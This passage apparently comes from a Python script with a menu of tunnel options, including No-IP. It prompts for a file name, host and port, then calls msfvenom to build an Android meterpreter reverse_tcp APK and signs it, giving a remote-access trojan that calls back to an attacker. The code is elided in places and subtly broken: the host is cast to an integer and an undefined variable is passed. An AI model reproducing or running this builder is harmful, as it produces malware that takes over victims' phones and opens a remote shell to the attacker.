...
[ 3 ] No-IP''')
            ...
            if tunnel == 1:
                ...
                name = input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
                lport = int(input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
                ...
                name = input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
                lhost = int(input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mno-ip host\033[0m) > '))
                lport = int(input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
                os.system('msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} --platform android -o {}.apk && d2j-apk-sign {}.apk && rm -f {}.apk && mv {}-signed.apk {}.apk'.format(ip, lport, name, name, name, name, name))
...
[ 3 ] No-IP''')
        ...
        network()
        net = int(input(' [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
